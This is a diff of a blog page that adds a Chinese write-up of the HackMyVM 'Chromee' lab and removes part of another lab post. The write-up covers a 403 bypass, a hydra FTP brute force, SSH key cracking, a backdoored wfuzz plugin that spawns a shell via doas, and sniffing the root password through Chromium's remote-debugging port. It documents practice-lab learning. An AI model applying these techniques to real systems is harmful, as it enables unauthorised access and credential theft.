@@ -185,6 +185,171 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/03/21/Chromee/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lvzhouhang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/03/21/Chromee/" class="post-title-link" itemprop="url">HackmyVM-Chromee</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-21 19:11:42 / 修改时间：20:09:37" itemprop="dateCreated datePublished" datetime="2025-03-21T19:11:42+08:00">2025-03-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>arp-scan -l</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class="line">192.168.31.2    08:00:27:01:8c:4d       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.100  08:00:27:f9:e1:65       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 2.402 seconds (106.58 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<p>ip为192.168.31.100,然后用nmap扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.100 -p-</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 07:14 EDT</span><br><span class="line">Nmap scan report for chromee.hmv (192.168.31.100)</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">8080/tcp  open  http-proxy</span><br><span class="line">23333/tcp open  elxmgmt</span><br><span class="line">MAC Address: 08:00:27:F9:E1:65 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><p>gobuster扫描目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# gobuster dir -u &quot;http://192.168.31.100&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-me</span><br><span class="line">dium.txt -x .txt,.php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.31.100</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/post.php             (Status: 200) [Size: 3]</span><br><span class="line">/secret.php           (Status: 200) [Size: 549]</span><br></pre></td></tr></table></figure>
+
+<p>有一个post.php和secret.php,secret.php不会解析成php会直接下载下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#secret.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Secret&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    $greeting = date(&#x27;H&#x27;) &lt; 12 ? &#x27;早上好&#x27; : (date(&#x27;H&#x27;) &lt; 18 ? &#x27;下午好&#x27; : &#x27;晚上好&#x27;);</span><br><span class="line">    $visitorIP = htmlspecialchars($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;h1&gt;&#123;$greeting&#125;，adriana&lt;/h1&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;当前时间：&quot; . date(&#x27;Y-m-d H:i:s&#x27;) . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;你的IP：&#123;$visitorIP&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    if (isset($_GET[&#x27;aaa&#x27;])) &#123;</span><br><span class="line">    	$file_content = file_get_contents(&#x27;/opt/note/dic.txt&#x27;);</span><br><span class="line">    	echo $file_content;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">    		die();</span><br><span class="line">	&#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="8080端口"><a href="#8080端口" class="headerlink" title="8080端口"></a>8080端口</h1><p>先用gobuster扫描一下目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# gobuster dir -u &quot;http://192.168.31.100:8080&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2</span><br><span class="line">.3-medium.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.31.100:8080</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/javascript           (Status: 301) [Size: 328] [--&gt; http://192.168.31.100:8080/javascript/]</span><br><span class="line">/silence              (Status: 403) [Size: 281]</span><br><span class="line">/server-status        (Status: 403) [Size: 281]</span><br></pre></td></tr></table></figure>
+
+<p>有一个silence，访问发现Forbidden了</p>
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Chromee1.png"></p>
+<p>用bp的BypassPro插件发现换一种请求会变成301，感觉有问题，后面添加一个index.html发现绕过了</p>
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Chromee2.png"></p>
+<p>有一个邮箱，将这个域名添加进hosts里，再去访问<a target="_blank" rel="noopener" href="http://chromee.hmv/secret.php%E5%8F%91%E7%8E%B0secret.php%E8%A7%A3%E6%9E%90%E4%BA%86%EF%BC%8CGET%E4%BC%A0%E5%85%A5aaa=1">http://chromee.hmv/secret.php发现secret.php解析了，GET传入aaa=1</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">下午好，adriana</span><br><span class="line">当前时间：2025-03-21 12:28:34</span><br><span class="line"></span><br><span class="line">你的IP：192.168.31.1</span><br><span class="line"></span><br><span class="line">The Lost Key Lily, a curious girl, found an old rusty key in the woods. Wondering where it belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: “The greatest treasure is the journey, not the prize.” Lily smiled, realizing the adventure was the real reward.</span><br></pre></td></tr></table></figure>
+
+<p>这里有两个人名，adriana和Lily，用cupp各生成一个字典，然后将两个字典合并爆破ftp(23333端口)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# hydra -L ./name -P ./pass 192.168.31.100 ftp -s 23333 -f  -t 50</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-21 07:32:30</span><br><span class="line">[DATA] max 50 tasks per 1 server, overall 50 tasks, 208 login tries (l:2/p:104), ~5 tries per task</span><br><span class="line">[DATA] attacking ftp://192.168.31.100:23333/</span><br><span class="line">[23333][ftp] host: 192.168.31.100   login: adriana   password: Lily2020</span><br><span class="line">[STATUS] attack finished for 192.168.31.100 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-21 07:32:31</span><br></pre></td></tr></table></figure>
+
+<p>爆破出了账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# ftp adriana@192.168.31.100 23333</span><br><span class="line">Connected to 192.168.31.100.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls -al</span><br><span class="line">229 Entering Extended Passive Mode (|||20808|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 106      115          4096 Mar 09 08:13 .</span><br><span class="line">drwxr-xr-x    4 0        0            4096 Mar 09 08:12 ..</span><br><span class="line">-rw-r--r--    1 0        0            3414 Mar 09 08:13 ...</span><br><span class="line">-rw-r--r--    1 0        0             495 Mar 07 14:40 dic.txt</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure>
+
+<p>这有…文件，一开始以为是一个目录，cd不进去，也不看报错就没管了(唉，细节决定成败)导致卡了好长时间，但是卡的时候也没有荒废，在/srv目录下有一个zeus.conf，后面提权要用到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# cat zeus.conf</span><br><span class="line">permit follower as softly cmd /usr/local/bin/wfuzz</span><br><span class="line">permit nopass :softly as root cmd /usr/bin/chromium</span><br><span class="line">permit nopass :softly as root cmd /usr/bin/kill</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; cd /home</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||5941|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-x---    5 1000     1000         4096 Mar 21 08:18 follower</span><br><span class="line">drwxr-x---    5 1001     1001         4096 Mar 21 05:37 softly</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure>
+
+<p>还可以知道用户名</p>
+<p>…文件是一个私钥，john可以爆破出来密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# john 1 --show</span><br><span class="line">id:cassandra</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# ssh follower@192.168.31.100 -i id</span><br><span class="line">Enter passphrase for key &#x27;id&#x27;:</span><br><span class="line">follower@Chromee:~$</span><br></pre></td></tr></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>follower下有一个cat.git和note.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:~$ cat note.txt</span><br><span class="line">Think about rotations and the cat’s secrets.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">47 is not just a number, it&#x27;s a twist of fate.</span><br></pre></td></tr></table></figure>
+
+<p>这个47提示的很明显是rot47</p>
+<p>cat.gif用convert可以分离出来12张图片，但是没有用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert cat.gif 1.jpg</span><br></pre></td></tr></table></figure>
+
+<p>不是空间轴可以试试时间轴</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# identify -format &quot;%T &quot; cat.gif</span><br><span class="line">65 98 65 100 102 98 67 6 6 6 6 6 6</span><br></pre></td></tr></table></figure>
+
+<p>将后面的6个6去掉扔进cyberchef中解密然后rot47解密</p>
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Chromee3.png"></p>
+<p>得到了p3p573r，因为前面拿到的zeus.conf能够知道follower需要密码才能以softly执行wfuzz</p>
+<p>先用find找到wfuzz的路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find / -name &quot;wfuzz&quot; 2&gt;/dev/null</span><br><span class="line">/home/follower/.config/wfuzz</span><br><span class="line">/usr/local/bin/wfuzz</span><br><span class="line">/usr/local/lib/python3.9/dist-packages/wfuzz    #这个就是wfuzz的路径</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find ./ -writable 2&gt;/dev/null</span><br><span class="line">./plugins/payloads/file.py</span><br></pre></td></tr></table></figure>
+
+<p>在他的wfuzz的目录下找可以写的文件能找到file.py,cat一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ cat ./plugins/payloads/file.py</span><br><span class="line">import pty</span><br><span class="line">pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>不用想了，肯定是作者降低难度了后门都留好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">follower@Chromee:~$ /usr/local/bin/doas -u softly /usr/local/bin/wfuzz -z file -u &quot;127.0.0.1&quot;</span><br><span class="line">Password:</span><br><span class="line"> /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">softly@Chromee:/home/follower$</span><br></pre></td></tr></table></figure>
+
+<p>上传pspy64，能发现每隔一段时间root用户都会执行secript.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2025/03/21 12:53:01 CMD: UID=0     PID=1504   | /bin/sh -c /root/script.sh</span><br><span class="line">2025/03/21 12:53:01 CMD: UID=0     PID=1505   | /bin/bash /root/script.sh</span><br></pre></td></tr></table></figure>
+
+<p>结合题目名Chromee和前面得到的zeus.conf，能猜到肯定和浏览器有关系，运行linpeas.sh能看到/media下有一个debug.kdbx</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# file debug.kdbx</span><br><span class="line">debug.kdbx: PDF document, version 1.7</span><br></pre></td></tr></table></figure>
+
+<p>是一个pdf文件</p>
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Chromee4.png"></p>
+<p>去网上查这个东西，谷歌浏览器自带这个工具chrome://inspect/，还有这个9222的默认端口（后面要用到）</p>
+<p>先写一个authorized_keys</p>
+<p>在网上查到开启远程debug的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doas /usr/bin/chromium --headless --remote-debugging-port=9222 --no-sandbox http://127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>因为靶机没有桌面，所以一定要带上–headless，不然会报错，启动好后再用socat端口转发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">softly@Chromee:~$ ./socatx64.bin TCP-LISTEN:9999,fork TCP4:127.0.0.1:9222</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Chromee5.png"></p>
+<p>用谷歌浏览器连接，打开第一个连接</p>
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Chromee6.png"></p>
+<p>等一会就会发现向127.0.0.1/post.php发送一个key，不用base64解码，这个就是root的密码。</p>
+<p>chromium的远程端口必须要是9222默认端口否则他监听不到就很难受</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/02/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1147,147 +1312,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/01/22/HackmyVM-Pwned/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lvzhouhang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/01/22/HackmyVM-Pwned/" class="post-title-link" itemprop="url">HackmyVM-Pwned</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2025-01-22 14:22:18 / 修改时间：15:03:05" itemprop="dateCreated datePublished" datetime="2025-01-22T14:22:18+08:00">2025-01-22</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>10k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>9 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>arp-scan -l扫描ip</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class="line">192.168.31.51   08:00:27:c4:72:27       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br><span class="line">192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)</span><br><span class="line">192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.986 seconds (128.90 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>
-
-<p>ip为192.168.31.51，然后nmap扫描开放端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.51 --min-rate=1000 -p-</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 01:21 EST</span><br><span class="line">Nmap scan report for pwned (192.168.31.51)</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:C4:72:27 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds</span><br></pre></td></tr></table></figure>
-
-<p>开放了21,22,80端口</p>
-<h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# gobuster dir -u &quot;http://192.168.31.51&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.31.51</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   